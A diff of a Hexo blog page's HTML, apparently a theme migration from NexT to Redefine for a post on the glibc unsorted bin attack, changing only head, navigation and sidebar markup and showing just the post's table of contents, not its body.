@@ -1,292 +1,609 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Kylinxin, security, Web3, Rust, pwn, CTF">
+    
+    
+    <meta name="author" content="Kylinxin">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
 
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+                // Try immediately
+                if (addBodyClass()) return;
 
-<link rel="stylesheet" href="/css/main.css?v=linear-verge-20260603c">
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 
-
-
-<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free@7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://unpkg.com/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"kylinxin.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null,"show_result":true},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":3,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
-
-    <meta name="description" content="关于unsorted bin 和 unsorted bin attack前言unsorted bin attack作为一种久远的攻击方式常常作为其他攻击方式的辅助手段，比如修改global_max_fast为一个较大的值使得几乎所有大小的chunk都用fast bin的管理方式进行分配和释放，又或者修改_IO_list_all来伪造_IO_FILE进行攻击。在上述攻击的利用过程中我们实际上并不需要">
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://kylinxin.github.io/2023/07/02/unsorted bin attack/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Kylinxin&#39;s notes on security, Web3, systems, and programming.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="unsorted bin">
 <meta property="og:url" content="https://kylinxin.github.io/2023/07/02/unsorted%20bin%20attack/index.html">
 <meta property="og:site_name" content="Kylinxin&#39;s Blog">
-<meta property="og:description" content="关于unsorted bin 和 unsorted bin attack前言unsorted bin attack作为一种久远的攻击方式常常作为其他攻击方式的辅助手段，比如修改global_max_fast为一个较大的值使得几乎所有大小的chunk都用fast bin的管理方式进行分配和释放，又或者修改_IO_list_all来伪造_IO_FILE进行攻击。在上述攻击的利用过程中我们实际上并不需要">
+<meta property="og:description" content="Kylinxin&#39;s notes on security, Web3, systems, and programming.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png">
-<meta property="og:image" content="https://s2.loli.net/2023/09/13/FgS2tZmrEkG7Kuo.png">
-<meta property="og:image" content="https://s2.loli.net/2023/09/13/rWY6xuMZ82yFJdj.png">
+<meta property="og:image" content="https://kylinxin.github.io/images/faction/1.png">
 <meta property="article:published_time" content="2023-07-01T17:58:29.000Z">
 <meta property="article:modified_time" content="2023-07-01T17:58:29.000Z">
 <meta property="article:author" content="Kylinxin">
 <meta property="article:tag" content="unsoted bin attack">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.loli.net/2023/09/13/brF2m8PKZeOVvRt.png">
+<meta name="twitter:image" content="https://kylinxin.github.io/images/faction/1.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/favicon.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            unsorted bin | Kylinxin&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
 
 
-<link rel="canonical" href="https://kylinxin.github.io/2023/07/02/unsorted%20bin%20attack/">
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://kylinxin.github.io/2023/07/02/unsorted%20bin%20attack/","path":"2023/07/02/unsorted bin attack/","title":"unsorted bin"}</script>
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
 
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>unsorted bin | Kylinxin's Blog</title>
-  
+    
 
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
 
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
 
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
 
+    <script id="hexo-configurations">
+    window.config = {"hostname":"kylinxin.github.io","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.75,"image_border_radius":"10px","image_alignment":"center","image_caption":true,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3rem","h2":"2.4rem","h3":"1.9rem","h4":"1.5rem","h5":"1.25rem","h6":"1.1rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["Kylinxin"]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"tokyo-night-dark"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":"#2F4858","default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1120px","sidebar_width":"240px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":false,"site_uv":false,"post_pv":false},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/faction/1.png","description":"Kylinxin's notes on security, Web3, systems, and programming."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Kylinxin's Blog","subtitle":{"text":["Security notes, exploit writeups, and engineering traces.","Web3, Rust, systems, and learning records.","Write, break, rebuild, and document."],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":70,"backing_speed":45,"starting_delay":350,"backing_delay":1800,"loop":true,"smart_backspace":true},"text_color":{"light":"#ffffff","dark":"#f4efe7"},"text_style":{"title_size":"3rem","subtitle_size":"1.25rem","line_height":1.25},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"center","links":[{"icon":"fa-brands fa-github","url":"https://github.com/Kylinxin"},{"icon":"fa-solid fa-rss","url":"/atom.xml"},{"icon":"fa-solid fa-at","url":null},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":true},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#141821","right":"#A31F34","transparency":28},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives/","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder-open"},"Tags":{"path":"/tags/","icon":"fa-regular fa-tags"},"Friends":{"path":"/friends/","icon":"fa-regular fa-link"},"About":{"path":"/about/","icon":"fa-regular fa-user"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":3,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"info","announcement":"CTF / Pwn / Web3 / Rust / notes","show_on_mobile":true,"links":{"GitHub":{"path":"https://github.com/Kylinxin","icon":"fa-brands fa-github"},"RSS":{"path":"/atom.xml","icon":"fa-solid fa-rss"}}},"article_date_format":"YYYY-MM-DD","excerpt_length":260,"categories":{"enable":true,"limit":4},"tags":{"enable":true,"limit":5}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-shield-halved\" style=\"color: #A31F34\"></i>","start":"2023/4/9 00:00:00","statistics":true,"customize":"Built with Hexo and Redefine.","icp":{"enable":false,"number":null,"url":null}},"footerStart":"2023/4/9 00:00:00","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.i18n = {"search":"站内搜索您需要的内容...","toc":"目录","prev":"上一页","next":"下一页","prev_posts":"上一篇","next_posts":"下一篇","page":"第 %d 页","recent_posts":"最新文章","share":"分享","powered_by":"由 %s 驱动","theme":"主题","rss_feed":"RSS Feed","category":"分类","categories":"分类","tag":"标签","tags":"标签","post":"文章","posts":"文章","tagcloud":"标签云","comment":"评论","comments":"评论","top":"置顶","sticky":"置顶","go-back-home":"回到首页","masonry_loading":"照片加载中...","image_viewer":"图片查看器","close":"关闭","exif":{"title":"EXIF","cards":{"camera":"相机","lens":"镜头","exposure":"曝光","other":"其他"},"fields":{"make":"品牌","model":"机型","date_taken":"拍摄时间","lens_model":"镜头","focal_length":"焦距","focus_mode":"对焦模式","shutter":"快门","aperture":"光圈","iso":"感光度","exposure_program":"曝光程序","exposure_compensation":"曝光补偿","metering_mode":"测光模式","flash":"闪光灯","white_balance":"白平衡","latitude":"纬度","longitude":"经度","altitude":"海拔"},"status":{"loading":"加载中...","no_exif":"无 EXIF 信息","library_missing":"EXIF 库未加载","image_source_missing":"图片地址不可用","unavailable":"EXIF 不可用（可能被 CORS 阻止或缺少元数据）","flag_unavailable":"EXIF 不可用"}},"home":"首页","archive":"归档","archives":"归档","about":"关于","links":"链接","link":"链接","friends":"友情链接","friend":"友情链接","timeline":"时间轴","shuoshuo":"说说","bookmarks":"书签","site_uv":"访问人数","site_pv":"总访问量","read_more":"阅读全文","wordcount":"字","min2read":"分钟","changelog":"更新日志","status":"状态","runtime":"博客已运行","days":"天","hours":"小时","minutes":"分钟","seconds":"秒","optimized_by":"并由 Evan 进行优化","rights":"版权所有","site_posts":"共撰写了 %s 篇文章","site_wordcount":"共 %s 字","copyright":{"title":"标题","author":"作者","link":"链接","create_time":"创建于","update_time":"更新于","license_title":"版权声明","license_content":"本文章采用 %s 进行许可。","all_rights_reserved":"版权所有 &#169 %s，禁止转载。","public_domain":"本文为公有领域作品，可自由转载、引用。"},"ago":{"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"},"create_time":"创建","update_time":"更新","expired":"这篇文章最后更新于 %s 天前，内容可能已经过时。"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
 
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
 
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
 
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
 
-  
-  <script src="https://unpkg.com/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
-<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
-
-  <script src="https://unpkg.com/hexo-generator-searchdb@1.5.0/dist/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
-<script src="/js/third-party/search/local-search.js" defer></script>
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-<link rel="alternate" href="/atom.xml" title="Kylinxin's Blog" type="application/atom+xml">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Kylinxin's Blog" type="application/atom+xml">
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
 
-  <main class="main">
-    <div class="column">
-      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
 
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">Kylinxin's Blog</p>
-      <i class="logo-line"></i>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger" aria-label="搜索" role="button">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
 </div>
 
+<main class="page-container" id="swup">
 
+	
 
-<nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup">
-      <div class="search-header">
-        <span class="search-icon">
-          <i class="fa fa-search"></i>
-        </span>
-        <div class="search-input-container">
-          <input autocomplete="off" autocapitalize="off" maxlength="80"
-                placeholder="搜索..." spellcheck="false"
-                type="search" class="search-input">
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Kylinxin&#39;s Blog
+                
+            </a>
         </div>
-        <span class="popup-btn-close" role="button">
-          <i class="fa fa-times-circle"></i>
-        </span>
-      </div>
-      <div class="search-result-container">
-        <div class="search-result-icon">
-          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives/"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-regular fa-folder-open fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/friends/"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    友情链接
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about/"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
         </div>
-      </div>
     </div>
-  </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives/"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder-open fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/friends/"
+                        >
+                            <span>
+                                友情链接
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about/"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           target="_blank" rel="noopener" href="https://github.com/Kylinxin"
+                        >
+                            <span>GitHub</span>
+                            <i class="fa-brands fa-github fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/atom.xml"
+                        >
+                            <span>RSS</span>
+                            <i class="fa-solid fa-rss fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">44</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">60</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
 
 </header>
-        
-  
-  <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
 
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Eunsorted-bin-%E5%92%8C-unsorted-bin-attack"><span class="nav-number">1.</span> <span class="nav-text">关于unsorted bin 和 unsorted bin attack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsotedbin-%E5%9F%BA%E6%9C%AC%E6%9D%A5%E6%BA%90"><span class="nav-number">1.2.</span> <span class="nav-text">unsotedbin 基本来源</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsortedbin-attack-%E6%A6%82%E8%BF%B0"><span class="nav-number">1.3.</span> <span class="nav-text">unsortedbin_attack 概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsortedbin-attack-%E6%95%88%E6%9E%9C"><span class="nav-number">1.4.</span> <span class="nav-text">unsortedbin_attack 效果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsortedbin-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.5.</span> <span class="nav-text">unsortedbin 源码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsortedbin-attack-%E5%8E%9F%E7%90%86"><span class="nav-number">1.6.</span> <span class="nav-text">unsortedbin_attack 原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Demo"><span class="nav-number">1.7.</span> <span class="nav-text">Demo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E8%B0%83%E8%AF%95"><span class="nav-number">1.7.1.</span> <span class="nav-text">开始调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8Cunsigned-long-p-x3D-malloc-0x410"><span class="nav-number">1.7.2.</span> <span class="nav-text">执行unsigned long *p&#x3D;malloc(0x410);</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8Cmalloc-500"><span class="nav-number">1.7.3.</span> <span class="nav-text">执行malloc(500);</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8Cfree-p"><span class="nav-number">1.7.4.</span> <span class="nav-text">执行free(p)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8Cp-1-x3D-unsigned-long-amp-stack-var-2"><span class="nav-number">1.7.5.</span> <span class="nav-text">执行p[1]&#x3D;(unsigned long)(&amp;stack_var-2);</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8Cmalloc-0x410"><span class="nav-number">1.7.6.</span> <span class="nav-text">执行malloc(0x410)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D"><span class="nav-number">1.8.</span> <span class="nav-text">反思</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.9.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
-        </div>
-        <!--/noindex-->
+		</div>
 
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Kylinxin"
-      src="/images/faction/1.png">
-  <p class="site-author-name" itemprop="name">Kylinxin</p>
-  <div class="site-description" itemprop="description">Kylinxin's Blog</div>
-</div>
-<div class="site-state-wrap animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">60</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories/">
-        <span class="site-state-item-count">14</span>
